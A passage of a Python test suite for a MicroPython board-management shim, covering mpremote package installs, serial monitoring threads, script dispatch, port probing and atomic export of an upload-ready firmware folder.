    # The JSON-RPC layer must forward the raw stderr too (not just the category), so the
    # extension can show the real reason and the cloud telemetry can record it.
    def runner(cmd, **_k):
        if "mip" in cmd:
            return subprocess.CompletedProcess(cmd, 1, "", "No such package: dht11_driver")
        return subprocess.CompletedProcess(cmd, 0, "", "")

    shim = Shim(runner=runner)
    res = _dispatch(shim, "device.install_package", {"port": "COM3", "url": "github:org/repo/x"})

    assert res["status"] == "error"
    assert res["error_kind"] == "package_not_found"
    assert "No such package" in res["message"]


def test_runner_captures_mpremote_output():
    calls = []

    def runner(cmd, **kwargs):
        calls.append((cmd, kwargs))
        return subprocess.CompletedProcess(cmd, 0, "COM3 303A:1001 MicroPython\n", "")

    shim = Shim(runner=runner)

    assert shim.scan() == ["COM3"]
    assert calls[0][1]["capture_output"] is True
    assert calls[0][1]["text"] is True
    assert calls[0][1]["timeout"] == 30


def test_list_files_preserves_names_with_spaces(monkeypatch):
    # mpremote fs ls prints "<size> <name>" and an "ls :" header. A name can contain spaces
    # (upload permits them), so splitting on the FIRST whitespace only must keep the whole name;
    # the old split()+parts[-1] returned just the last token ("data.bin"), so download/delete then
    # hit the wrong path (PR #31 review, finding 1).
    out = "ls :\n         132 my data.bin\n           0 my lib/\n"
    monkeypatch.setattr(
        "serve._run_mpremote",
        lambda args, timeout=30: subprocess.CompletedProcess(args, 0, out, ""),
    )
    result = _list_files("COM3")
    assert result["status"] == "ok"
    assert result["files"] == ["my data.bin", "my lib/"]  # header dropped, spaces + dir "/" kept


def test_install_uses_longer_timeout_for_mip_install():
    calls = []

    def runner(cmd, **kwargs):
        calls.append((cmd, kwargs))
        return subprocess.CompletedProcess(cmd, 0, "", "")

    shim = Shim(runner=runner)

    shim.install_package("COM3", "https://upypi.net/pkgs/aht20/1.0.0/package.json")

    assert calls[0][1]["timeout"] == 30
    assert calls[1][1]["timeout"] == 120


def test_serial_read_until_matches_or_times_out():
    shim = Shim(serial_factory=lambda *_args, **_kwargs: FakeSerial(["boot", "MPYHW_READY", "TEMP_C=31.2 LED=ON"]))

    result = shim.serial_read_until("COM3", ["MPYHW_READY", "TEMP_C="], timeout_s=0.1)

    assert result["lines"] == ["MPYHW_READY", "TEMP_C=31.2 LED=ON"]


def test_serial_read_until_all_lines_captures_the_full_window_lines_stays_markers_only():
    # The Serial page needs every line the deploy-verification read sees (a print()
    # between markers), not just the matched markers themselves. `all_lines` carries
    # the full window; `lines` (what the agent loop grades pass/fail on via
    # lines.at(-1)+ok) must stay exactly the matched-markers list it always was.
    # Mutation: revert to only appending matched markers -> all_lines == lines, fails.
    shim = Shim(serial_factory=lambda *_a, **_k: FakeSerial(
        ["noise", "MPYHW_READY", "print output", "TEMP_C=31.2 LED=ON"]
    ))

    result = shim.serial_read_until("COM3", ["MPYHW_READY", "TEMP_C="], timeout_s=0.5)

    assert result["ok"] is True
    assert result["lines"] == ["MPYHW_READY", "TEMP_C=31.2 LED=ON"]
    assert result["all_lines"] == ["noise", "MPYHW_READY", "print output", "TEMP_C=31.2 LED=ON"]


def test_serial_read_until_reassembles_markers_split_across_reads():
    # A real serial readline() with a short timeout can return a partial line; the
    # reader must buffer fragments and still match a marker split across reads.
    shim = Shim(serial_factory=lambda *_a, **_k: ChunkedSerial(["MPYH", "W_READY\n", "TEMP_C=", "31.2 LED=ON\n"]))

    result = shim.serial_read_until("COM3", ["MPYHW_READY", "TEMP_C="], timeout_s=0.5)

    assert result["ok"] is True
    assert result["lines"] == ["MPYHW_READY", "TEMP_C=31.2 LED=ON"]


def test_serial_read_until_times_out_when_markers_never_appear():
    # The device emits unrelated output (or nothing); the reader must give up at
    # the deadline and report a STRUCTURED timeout — the {"ok": False} branch the
    # method name promises but no other test exercised. (Not "hang" or "success".)
    shim = Shim(serial_factory=lambda *_a, **_k: FakeSerial(["noise", "still booting"]))

    result = shim.serial_read_until("COM3", ["MPYHW_READY"], timeout_s=0.1)

    assert result == {"ok": False, "error": "timeout", "lines": [], "all_lines": ["noise", "still booting"]}


@pytest.mark.slow
@pytest.mark.serial
def test_serial_read_until_drives_a_real_pyserial_loopback_port():
    # Exercise the REAL pyserial API surface the fakes bypass: serial_for_url, the
    # `with` context manager, reset_input_buffer (the getattr-guard the fakes never
    # hit), byte-level readline + decode, and the 0.05s read timeout. The device
    # bytes are fed from a thread AFTER entry so reset_input_buffer (called on open)
    # does not wipe them.
    serial = pytest.importorskip("serial")
    import threading
    import time

    ser = serial.serial_for_url("loop://", baudrate=115200, timeout=0.05)

    def feed():
        time.sleep(0.05)  # let serial_read_until open + reset_input_buffer first
        ser.write(b"MPYHW_READY\r\n")
        ser.write(b"TEMP_C=31.2 LED=ON\r\n")

    shim = Shim(serial_factory=lambda *_a, **_k: ser)
    writer = threading.Thread(target=feed)
    writer.start()
    try:
        result = shim.serial_read_until("loop://", ["MPYHW_READY", "TEMP_C="], timeout_s=2.0)
    finally:
        writer.join()

    assert result["ok"] is True
    assert result["lines"] == ["MPYHW_READY", "TEMP_C=31.2 LED=ON"]


def test_monitor_start_streams_lines_via_notify_until_stopped(monkeypatch):
    # The monitor pushes each line through _notify (a serial.data JSON-RPC
    # notification), not through the bounded serial_read_until response.
    # Mutation: drop the _notify call in _monitor_read_loop -> calls stays empty, fails.
    calls = []
    monkeypatch.setattr("serve._notify", lambda method, params: calls.append((method, params)))
    shim = Shim(serial_factory=lambda *_a, **_k: FakeSerial(["boot", "MPYHW_READY"]))

    result = shim.monitor_start("COM3")
    assert result == {"status": "ok"}

    deadline = time.monotonic() + 2.0
    while len(calls) < 2 and time.monotonic() < deadline:
        time.sleep(0.01)

    assert shim.monitor_stop() == {"status": "ok"}
    assert calls == [
        ("serial.data", {"lines": ["boot"]}),
        ("serial.data", {"lines": ["MPYHW_READY"]}),
    ]


def test_monitor_flushes_the_trailing_unterminated_line_on_stop(monkeypatch):
    """A board whose last output is sys.stdout.write("READY") -- no trailing newline --
    must still reach the Serial page: stopping used to drop the partial-line buffer
    unless it happened to exceed the cap. Mutation: drop the emit(buffer) flush in the
    finally block -> READY never appears, fails."""
    calls = []
    monkeypatch.setattr("serve._notify", lambda method, params: calls.append((method, params)))
    ser = ChunkedSerial(["boot\n", "READY"])
    shim = Shim(serial_factory=lambda *_a, **_k: ser)

    assert shim.monitor_start("COM3") == {"status": "ok"}
    # Deterministic: wait until the reader has CONSUMED both fragments (READY is then
    # sitting in the partial-line buffer), not merely until the first line arrived.
    deadline = time.monotonic() + 2.0
    while ser.fragments and time.monotonic() < deadline:
        time.sleep(0.01)
    assert not ser.fragments, "the reader never consumed the fixture"
    assert shim.monitor_stop() == {"status": "ok"}

    assert calls == [
        ("serial.data", {"lines": ["boot"]}),
        ("serial.data", {"lines": ["READY"]}),
    ]


def test_monitor_reassembles_a_multibyte_char_split_across_reads(monkeypatch):
    """A multi-byte character split across the 0.1s read boundary must survive: the old
    per-chunk decode(errors="ignore") ate BOTH halves, silently losing characters from
    exactly the non-ASCII print() output this product's users emit. Bytes are buffered
    and a complete line decodes as one unit. Mutation: revert to per-chunk decode ->
    the split character vanishes, fails."""

    class ByteFragmentSerial:
        """ChunkedSerial takes str fragments (it encodes whole characters); this feeds
        RAW byte fragments so the split can land inside one character's encoding."""

        def __init__(self, fragments):
            self.fragments = list(fragments)

        def readline(self):
            return self.fragments.pop(0) if self.fragments else b""

        def close(self):
            pass

    calls = []
    monkeypatch.setattr("serve._notify", lambda method, params: calls.append((method, params)))
    raw = "温度=31.2\n".encode()
    ser = ByteFragmentSerial([raw[:4], raw[4:]])  # index 4 is inside 度 (bytes 3..5)
    shim = Shim(serial_factory=lambda *_a, **_k: ser)

    assert shim.monitor_start("COM3") == {"status": "ok"}
    deadline = time.monotonic() + 2.0
    while len(calls) < 1 and time.monotonic() < deadline:
        time.sleep(0.01)
    assert shim.monitor_stop() == {"status": "ok"}

    assert calls == [("serial.data", {"lines": ["温度=31.2"]})]


def test_monitor_start_refuses_a_second_start_while_one_is_running():
    # The host enforces one monitor at a time via port ownership; the shim refusing a
    # second start (instead of silently replacing the session) keeps both sides honest
    # if they ever disagree. Mutation: drop the is_alive() guard -> this fails.
    shim = Shim(serial_factory=lambda *_a, **_k: FakeSerial([]))
    try:
        first = shim.monitor_start("COM3")
        second = shim.monitor_start("COM3")
        assert first == {"status": "ok"}
        assert second == {"status": "error", "error_kind": "monitor_already_running"}
    finally:
        shim.monitor_stop()


def test_monitor_start_port_open_failure_returns_an_error_never_silent_empty():
    # A closed/busy/nonexistent port must be reported, never look like "connected,
    # nothing to see yet" (spec: "Port-open failure -> error, never silent empty").
    def factory(*_a, **_k):
        raise OSError("could not open port COM99")

    shim = Shim(serial_factory=factory)

    result = shim.monitor_start("COM99")

    assert result["status"] == "error"
    assert result["error_kind"] == "port_open_failed"
    assert "COM99" in result["message"]


def test_monitor_stop_with_nothing_running_is_an_idempotent_no_op():
    shim = Shim(serial_factory=lambda *_a, **_k: FakeSerial([]))

    assert shim.monitor_stop() == {"status": "ok"}


def test_monitor_read_loop_notifies_monitor_ended_when_the_port_dies_on_its_own(monkeypatch):
    # An unplugged/errored port must tell the host, or the Start/Stop button is stuck
    # showing a monitor that silently ended (review fix). Mutation: drop the `died`
    # tracking / the finally-block _notify call -> calls stays empty, fails.
    calls = []
    monkeypatch.setattr("serve._notify", lambda method, params: calls.append((method, params)))

    class DyingSerial:
        def readline(self):
            raise OSError("device reports readiness to read but returned no data")

        def close(self):
            pass

    shim = Shim(serial_factory=lambda *_a, **_k: DyingSerial())
    assert shim.monitor_start("COM3") == {"status": "ok"}

    deadline = time.monotonic() + 2.0
    while not calls and time.monotonic() < deadline:
        time.sleep(0.01)

    assert len(calls) == 1
    assert calls[0][0] == "serial.monitor_ended"
    assert "device reports readiness" in calls[0][1]["reason"]
    # The reader thread must have actually exited (not left running under a name the
    # host no longer references) — monitor_stop's not-running path proves that.
    assert shim.monitor_stop() == {"status": "ok"}


def test_monitor_stop_after_a_normal_stop_does_not_notify_monitor_ended(monkeypatch):
    # An intentional stop is not a failure; only the port dying on its OWN triggers
    # monitor_ended. monitor_stop() closes the port to unblock a stuck readline(), and
    # on a REAL pyserial port that makes readline() RAISE -- so the fixture here must
    # reproduce that (unlike FakeSerial, whose close() is a no-op and readline() never
    # raises, which would pass this test even with the bug it guards).
    #
    # This must deterministically land the reader thread INSIDE a blocking readline()
    # call at the moment monitor_stop() runs, or the empty-read wait added alongside
    # this fix (stop_event.wait(0.01)) can let the thread notice stop_event first and
    # exit the loop before ever calling readline() again -- which would make this test
    # pass regardless of the fix, without ever exercising the except branch at all.
    calls = []
    monkeypatch.setattr("serve._notify", lambda method, params: calls.append((method, params)))

    class CloseMakesABlockedReadFailSerial:
        def __init__(self, lines):
            self.lines = [f"{line}\n".encode() for line in lines]
            self._closed = False
            self.entered_blocking_read = threading.Event()
            self.released = threading.Event()

        def readline(self):
            if self.lines:
                return self.lines.pop(0)
            # No more data: block here (like a real serial read with nothing
            # arriving) until close() releases it.
            self.entered_blocking_read.set()
            self.released.wait(timeout=2.0)
            if self._closed:
                raise OSError("read failed: device reports readiness to read but returned no data")
            return b""

        def close(self):
            self._closed = True
            self.released.set()

    ser = CloseMakesABlockedReadFailSerial(["boot"])
    shim = Shim(serial_factory=lambda *_a, **_k: ser)

    assert shim.monitor_start("COM3") == {"status": "ok"}
    # Wait until the reader thread has consumed "boot" and is now BLOCKED inside the
    # next readline() call -- the exact moment monitor_stop()'s close() must interrupt.
    assert ser.entered_blocking_read.wait(timeout=2.0), "the reader thread never reached its blocking read"

    assert shim.monitor_stop() == {"status": "ok"}

    assert not any(method == "serial.monitor_ended" for method, _ in calls)
    # Mutation: drop `if not stop_event.is_set():` around `died = exc` in the except
    # branch -> the close-induced read failure above is misread as the port dying on
    # its own, and this fires spuriously on every ordinary stop.


def test_monitor_stop_join_timeout_refuses_a_second_start_instead_of_double_opening():
    # A reader thread that does not exit within the join window must NOT have its state
    # cleared -- clearing it would let monitor_start's is_alive() guard pass and open the
    # SAME port again while the stuck thread might still be using it (review fix).
    class WedgedSerial:
        def readline(self):
            # Ignores close() entirely -- simulates a driver that does not unblock a
            # stuck read, so the reader thread cannot exit within the (short) join
            # window below. Long enough to outlast join_timeout, short enough to keep
            # the suite fast; stop_event is already set by the time this returns, so
            # the thread exits normally right after (no dangling thread past this test).
            time.sleep(0.5)
            return b""

        def close(self):
            pass

    shim = Shim(serial_factory=lambda *_a, **_k: WedgedSerial())
    assert shim.monitor_start("COM3") == {"status": "ok"}

    result = shim.monitor_stop(join_timeout=0.1)

    assert result == {"status": "error", "error_kind": "monitor_stop_timed_out"}
    second = shim.monitor_start("COM3")
    assert second == {"status": "error", "error_kind": "monitor_already_running"}
    # Mutation: clear _monitor_thread/_monitor_stop/_monitor_ser unconditionally
    # (before checking is_alive()) -> the second start above would return {"status":
    # "ok"}, silently opening the port a second time.


def test_monitor_read_loop_caps_an_unterminated_buffer_instead_of_growing_without_bound(monkeypatch):
    # A device that emits bytes with no newline (binary spew, a stuck print(end=""))
    # must not grow the reader's buffer forever for the life of a long monitor session.
    # Mutation: drop the buffer-cap flush -> the fragments below never get force-flushed
    # and no serial.data notification carries them.
    calls = []
    monkeypatch.setattr("serve._notify", lambda method, params: calls.append((method, params)))

    class SpewingSerial:
        def __init__(self):
            self.chunks = [b"x" * 100 for _ in range(200)] + [b""]  # 20000 bytes, no '\n'

        def readline(self):
            return self.chunks.pop(0) if self.chunks else b""

        def close(self):
            pass

    shim = Shim(serial_factory=lambda *_a, **_k: SpewingSerial())
    assert shim.monitor_start("COM3") == {"status": "ok"}
    deadline = time.monotonic() + 2.0
    while not calls and time.monotonic() < deadline:
        time.sleep(0.01)
    shim.monitor_stop()

    assert calls, "the over-cap buffer must be force-flushed as a notification"
    flushed_len = len(calls[0][1]["lines"][0])
    assert flushed_len <= Shim._MONITOR_BUFFER_CAP + 100  # one chunk beyond the cap at most


def test_stdout_writes_are_lock_serialized_so_notifications_cannot_corrupt_a_response():
    # serial.data notifications are pushed from the monitor's background thread while
    # the main thread may be mid-_respond for an unrelated RPC. Without a shared lock
    # around every stdout write, two threads' write() calls can interleave mid-line and
    # corrupt the newline-delimited JSON framing the extension's reader depends on.
    # This drives both write paths concurrently against a stream double that flags any
    # write() call that overlaps another (a deliberate sleep widens the window so a
    # missing lock reliably overlaps rather than depending on GIL scheduling luck).
    # Mutation: remove the `with _stdout_lock:` in _write_line -> overlap is detected, fails.
    import serve

    guard = threading.Lock()
    state = {"active": 0, "overlap": False}
    written = []

    class RaceDetectingStream:
        def write(self, s):
            with guard:
                state["active"] += 1
                if state["active"] > 1:
                    state["overlap"] = True
            time.sleep(0.002)
            written.append(s)
            with guard:
                state["active"] -= 1

        def flush(self):
            pass

    monkeypatch_stdout = RaceDetectingStream()
    real_stdout = serve.sys.stdout
    serve.sys.stdout = monkeypatch_stdout
    try:
        def hammer_notify():
            for _ in range(15):
                serve._notify("serial.data", {"lines": ["x"]})

        def hammer_respond():
            for i in range(15):
                serve._respond({"jsonrpc": "2.0", "id": i, "result": {}})

        t1 = threading.Thread(target=hammer_notify)
        t2 = threading.Thread(target=hammer_respond)
        t1.start()
        t2.start()
        t1.join()
        t2.join()
    finally:
        serve.sys.stdout = real_stdout

    assert state["overlap"] is False
    assert len(written) == 30


def test_run_script_builds_a_python_command_with_args():
    calls = []

    def runner(cmd, **kwargs):
        calls.append((cmd, kwargs))
        return subprocess.CompletedProcess(cmd, 0, "ok", "")

    shim = Shim(runner=runner)
    shim.run_script("/path/to/validate_json.py", ["--schema", "s.json", "--json", "m.json"])

    # Runs with the shim's own interpreter so venv deps (jsonschema/flake8/requests) resolve.
    assert calls[0][0][0] == sys.executable
    assert calls[0][0][1:] == ["/path/to/validate_json.py", "--schema", "s.json", "--json", "m.json"]
    assert calls[0][1]["capture_output"] is True
    assert calls[0][1]["text"] is True
    # UTF-8 forced on both ends so non-ASCII script output (Chinese manifest values,
    # em-dashes) never crashes the decode on a non-UTF-8 locale (Windows cp936).
    assert calls[0][1]["encoding"] == "utf-8"
    assert calls[0][1]["errors"] == "replace"
    assert calls[0][1]["env"]["PYTHONIOENCODING"] == "utf-8"


def test_resolve_script_and_schema_paths():
    assert resolve_script("validate").replace("\\", "/").endswith("upy-project-gen-toolchain-spec/scripts/validate_json.py")
    # scaffold/download_drivers use the LEGACY (non-plugin) scripts on purpose (they write files
    # from --project-dir; the -plugin equivalents are stdout-only and reject the arg).
    assert resolve_script("scaffold").replace("\\", "/").endswith("upy-scaffold/scripts/init_scaffold.py")
    assert resolve_script("download_drivers").replace("\\", "/").endswith("upy-generate/scripts/download_drivers.py")
    assert resolve_schema("wiring").replace("\\", "/").endswith("upy-project-gen-toolchain-spec/wiring.schema.json")
    assert resolve_schema("nope") is None
    assert os.path.isabs(scripts_root())


def test_run_validate_maps_exit_codes_to_validity():
    # rc 0 = valid, rc 1 = invalid; BOTH are transport-ok (the validity rides in `valid`).
    ok = _run_validate(Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 0, "[OK] valid", "")),
                       {"project_dir": "/p", "schema": "project-manifest"})
    assert ok == {"status": "ok", "valid": True, "exit_code": 0, "output": "[OK] valid"}

    bad = _run_validate(Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 1, "[FAIL] 1 error", "")),
                        {"project_dir": "/p", "schema": "project-manifest"})
    assert bad["status"] == "ok" and bad["valid"] is False and bad["exit_code"] == 1


def test_run_validate_joins_project_dir_and_rejects_unknown_schema(tmp_path):
    captured = {}

    def runner(cmd, **_k):
        captured["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, "", "")

    _run_validate(Shim(runner=runner), {"project_dir": str(tmp_path), "path": "wiring.json", "schema": "wiring"})
    # --json arg is project_dir joined with the relative path.
    json_arg = captured["cmd"][captured["cmd"].index("--json") + 1]
    assert json_arg == os.path.join(str(tmp_path), "wiring.json")

    assert _run_validate(Shim(runner=runner), {"schema": "nope"}) == {"status": "error", "error_kind": "unknown_schema"}


def test_run_project_script_maps_nonzero_exit_to_error():
    fail = _run_project_script(Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 1, "", "boom")),
                               "scaffold", ["--project-dir", "/p", "--mode", "timer"])
    assert fail["status"] == "error" and fail["error_kind"] == "script_failed" and "boom" in fail["message"]

    ok = _run_project_script(Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 0, "[OK] done", "")),
                             "download_drivers", ["--project-dir", "/p"])
    assert ok == {"status": "ok", "exit_code": 0, "output": "[OK] done"}


def _write_manifest(project_dir, extra=None):
    manifest = {"mcu": {"model": "ESP32-C6"}, "requirements": {"sample_rate": "normal_1hz"}, "pinout": [], "devices": []}
    if extra:
        manifest.update(extra)
    (project_dir / "project-manifest.json").write_text(json.dumps(manifest), encoding="utf-8")


def test_run_scaffold_dispatch_runs_the_real_legacy_cli(tmp_path):
    # Adapter-level: run the REAL scaffold script through _dispatch with NO mock runner. The
    # -plugin init_scaffold.py ignores --project-dir (argparse.SUPPRESS) and only writes JSON to
    # stdout, so it produces no files; the host dispatch passes --project-dir and expects files on
    # disk. This is why SCRIPT_FILES["scaffold"] must point at the LEGACY upy-scaffold script.
    # Mutation: repoint scaffold to upy-scaffold-plugin -> no firmware/board.py written -> fails.
    _write_manifest(tmp_path)
    result = _dispatch(Shim(), "script.run_scaffold", {"project_dir": str(tmp_path), "mode": "timer"})
    assert result["status"] == "ok", result
    assert result["exit_code"] == 0
    assert (tmp_path / "firmware" / "board.py").exists()


def test_run_download_drivers_dispatch_runs_the_real_legacy_cli(tmp_path):
    # Adapter-level: the REAL download script through _dispatch, no mock. The -plugin
    # download_drivers.py rejects --project-dir (argparse exit 2, "unrecognized arguments"); only
    # the LEGACY upy-generate script accepts it, loads the manifest, and stamps
    # generate.driver_downloaded_at. Empty devices -> no network access (offline-safe).
    # Mutation: repoint download_drivers to upy-generate-plugin -> exit 2 -> fails.
    _write_manifest(tmp_path)
    result = _dispatch(Shim(), "script.run_download_drivers", {"project_dir": str(tmp_path)})
    assert result["status"] == "ok", result
    assert result["exit_code"] == 0
    manifest = json.loads((tmp_path / "project-manifest.json").read_text(encoding="utf-8"))
    assert "driver_downloaded_at" in manifest.get("generate", {})


def test_run_module_builds_python_dash_m_command_with_cwd():
    calls = []

    def runner(cmd, **kwargs):
        calls.append((cmd, kwargs))
        return subprocess.CompletedProcess(cmd, 0, "", "")

    Shim(runner=runner).run_module("flake8", ["firmware", "--max-line-length=120"], cwd="/proj")
    assert calls[0][0] == [sys.executable, "-m", "flake8", "firmware", "--max-line-length=120"]
    assert calls[0][1]["cwd"] == "/proj"


def test_run_static_check_keys_clean_on_flake8():
    # flake8 clean + pylint noisy -> still clean (pylint is advisory); flake8 dirty -> not clean.
    def runner(rc_by_module):
        def run(cmd, **_k):
            module = cmd[2]
            return subprocess.CompletedProcess(cmd, rc_by_module.get(module, 0), f"{module} out", "")
        return run

    clean = _run_static_check(Shim(runner=runner({"flake8": 0, "pylint": 16})), {"project_dir": "/p"})
    assert clean["clean"] is True and clean["flake8"]["exit_code"] == 0 and clean["pylint"]["exit_code"] == 16

    dirty = _run_static_check(Shim(runner=runner({"flake8": 1, "pylint": 0})), {"project_dir": "/p"})
    assert dirty["clean"] is False and "flake8 out" in dirty["flake8"]["output"]


def test_run_simulate_maps_pytest_exit_codes():
    passed = _run_simulate(Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 0, "2 passed", "")), {"project_dir": "/p"})
    assert passed["passed"] is True and passed["no_tests"] is False

    none = _run_simulate(Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 5, "no tests ran", "")), {"project_dir": "/p"})
    assert none["passed"] is False and none["no_tests"] is True

    failed = _run_simulate(Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 1, "1 failed", "")), {"project_dir": "/p"})
    assert failed["passed"] is False and failed["no_tests"] is False


def test_run_render_builds_input_output_format_args():
    captured = {}

    def runner(cmd, **_k):
        captured["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, "rendered", "")

    res = _run_render(Shim(runner=runner), "diagram", {"project_dir": "/proj"})
    assert res == {"status": "ok", "exit_code": 0, "output": "rendered"}
    cmd = captured["cmd"]
    assert cmd[1].replace("\\", "/").endswith("upy-diagram-plugin/scripts/render_diagram_local.py")
    # default format is md (offline), reading docs/diagram.json into docs/.
    assert cmd[cmd.index("--format") + 1] == "md"
    assert cmd[cmd.index("--input") + 1] == os.path.join("/proj", "docs", "diagram.json")
    assert cmd[cmd.index("--output") + 1] == os.path.join("/proj", "docs")


def test_run_render_maps_nonzero_to_error():
    fail = _run_render(Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 1, "", "bad json")), "wiring", {"project_dir": "/p"})
    assert fail["status"] == "error" and fail["error_kind"] == "render_failed" and "bad json" in fail["message"]


def test_run_flash_device_resets_without_recopy_or_rescan(tmp_path):
    fw = tmp_path / "firmware"
    fw.mkdir()
    (fw / "main.py").write_text("print('MPYHW_READY')", encoding="utf-8")

    def runner(cmd, **_k):
        if "list" in cmd:
            return subprocess.CompletedProcess(cmd, 0, "COM7 MicroPython\nCOM8 MicroPython\n", "")
        return subprocess.CompletedProcess(cmd, 0, "", "")

    shim = Shim(runner=runner)
    result = _run_flash_device(shim, {"project_dir": str(tmp_path), "path": "firmware/main.py", "port": "COM8"})

    assert result["status"] == "ok"
    # No project flash script: write_main_py already deployed the tree, so the fallback
    # only resets the selected port. It must NOT re-copy main.py and NOT rescan ports.
    assert ["mpremote", "connect", "COM8", "reset"] in shim.commands
    assert not any(command[:6] == ["mpremote", "connect", "COM8", "resume", "fs", "cp"] for command in shim.commands)
    assert not any(command == ["mpremote", "connect", "list"] for command in shim.commands)


def test_probe_micropython_true_when_repl_echoes_marker():
    shim = Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 0, "mpy-ok\r\n", ""))

    result = shim.probe_micropython("COM3")

    assert result == {"has_micropython": True}
    # A bare exec of a print is the cheapest way to confirm a live MicroPython REPL.
    assert shim.commands[-1] == ["mpremote", "connect", "COM3", "exec", "print('mpy-ok')"]


def test_probe_micropython_false_when_no_repl():
    # Port has a board/adapter but it is NOT running MicroPython: mpremote cannot
    # enter the REPL, exits non-zero, and never echoes the marker.
    shim = Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 1, "", "could not enter raw repl"))

    assert shim.probe_micropython("COM3") == {"has_micropython": False}


def test_probe_micropython_false_on_timeout_without_raising():
    # An unresponsive board makes mpremote hang; the probe must absorb the timeout
    # and report "no MicroPython" rather than letting TimeoutExpired escape.
    def runner(cmd, **_k):
        raise subprocess.TimeoutExpired(cmd, 5)

    assert Shim(runner=runner).probe_micropython("COM3") == {"has_micropython": False}


def test_probe_micropython_uses_a_short_timeout():
    calls = []

    def runner(cmd, **kwargs):
        calls.append((cmd, kwargs))
        return subprocess.CompletedProcess(cmd, 0, "mpy-ok\n", "")

    Shim(runner=runner).probe_micropython("COM3")

    assert calls[0][1]["timeout"] == 5


def _build_upload_ready_project(project_dir, manifest=None):
    """The project tree the export tests share: a firmware/ carrying one of every
    excluded shape (mock.py/mock.mpy, __pycache__/*.pyc, tasks/.gitkeep) alongside the
    real device files, plus sibling tools/ and test/pc/ that must never reach the
    export. `manifest`, when given, is written to project-manifest.json."""
    fw = project_dir / "firmware"
    (fw / "lib").mkdir(parents=True)
    (fw / "lib" / "a.py").write_text("a", encoding="utf-8")
    (fw / "drivers" / "foo_driver").mkdir(parents=True)
    (fw / "drivers" / "foo_driver" / "__init__.py").write_text("class Foo: pass", encoding="utf-8")
    (fw / "drivers" / "foo_driver" / "mock.py").write_text("class MockFoo: pass", encoding="utf-8")
    (fw / "drivers" / "foo_driver" / "mock.mpy").write_bytes(b"\x00")
    (fw / "__pycache__").mkdir()
    (fw / "__pycache__" / "x.pyc").write_bytes(b"\x00")
    (fw / "tasks").mkdir()
    (fw / "tasks" / ".gitkeep").write_text("", encoding="utf-8")
    (fw / "main.py").write_text("m", encoding="utf-8")
    (fw / "boot.py").write_text("b", encoding="utf-8")
    (fw / "README.md").write_text("device notes", encoding="utf-8")
    (project_dir / "tools").mkdir()
    (project_dir / "tools" / "flash_device.py").write_text("# host helper", encoding="utf-8")
    (project_dir / "test" / "pc").mkdir(parents=True)
    (project_dir / "test" / "pc" / "test_a.py").write_text("def test_x(): pass", encoding="utf-8")
    if manifest is not None:
        (project_dir / "project-manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    return project_dir


def _two_mip_manifest():
    return {
        "mcu": {"model": "ESP32-C3-MINI-1"},
        "generate": {
            "runtime_dependencies": {
                "mip": [
                    {"package": "aht20", "version": "1.0.0", "target": "/lib", "verify_import": "aht20", "install_phase": "deploy"},
                    {"package": "aioble", "version": "latest", "target": "/lib", "verify_import": "aioble", "install_phase": "deploy", "asset_files": ["extra.bin"]},
                ],
            },
        },
    }


def _noop_shim():
    # project.export_upload_ready is filesystem-only; the shim instance is never
    # touched, but _dispatch's signature still takes one.
    return Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 0, "", ""))


def _minimal_firmware_project(project_dir, manifest=None):
    """A leaner fixture than _build_upload_ready_project: just firmware/main.py, no
    firmware/README.md -- for tests about mip/README parsing where a device README
    landing at the same export path would be an unrelated confound."""
    fw = project_dir / "firmware"
    fw.mkdir(parents=True)
    (fw / "main.py").write_text("m", encoding="utf-8")
    if manifest is not None:
        (project_dir / "project-manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    return project_dir


def test_export_upload_ready_keeps_the_previous_export_when_a_copy_fails(monkeypatch, tmp_path):
    """The folder's whole purpose is restoring a board, so a half-written one that LOOKS
    complete is worse than a failed export: it would be uploaded and brick the device.
    A mid-copy failure must leave the previous, complete export exactly as it was."""
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
    assert _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})["status"] == "ok"
    export_dir = project / "upload_ready"
    before = {p.name: p.read_bytes() for p in export_dir.rglob("*") if p.is_file()}
    assert before, "the first export produced something to protect"

    import serve
    real_copy2 = serve.shutil.copy2
    calls = {"n": 0}

    def failing_copy2(src, dst, *args, **kwargs):
        calls["n"] += 1
        if calls["n"] == 2:  # part-way through, so a partial tree exists in staging
            raise OSError(28, "No space left on device")
        return real_copy2(src, dst, *args, **kwargs)

    monkeypatch.setattr(serve.shutil, "copy2", failing_copy2)
    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "error"
    assert result["error_kind"] == "export_write_failed"
    after = {p.name: p.read_bytes() for p in export_dir.rglob("*") if p.is_file()}
    assert after == before, "the previous export is untouched, not wiped or half-replaced"
    assert not (project / "upload_ready.staging").exists(), "the failed attempt cleans up after itself"


def test_export_upload_ready_names_where_the_export_is_when_rollback_also_fails(monkeypatch, tmp_path):
    """The swap moves the old export aside, so if BOTH the install and the rollback rename
    fail the user's only complete folder is sitting under a name they have never heard of.
    Letting that OSError escape would hand them a generic RPC error and no way to find it."""
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
    assert _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})["status"] == "ok"

    import serve
    real_rename = serve.os.rename

    def failing_rename(src, dst, *args, **kwargs):
        # Let the "move the old aside" rename through, fail the install AND the rollback.
        if str(src).endswith("upload_ready") and str(dst).endswith(".previous"):
            return real_rename(src, dst, *args, **kwargs)
        raise OSError(13, "Permission denied")

    monkeypatch.setattr(serve.os, "rename", failing_rename)
    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

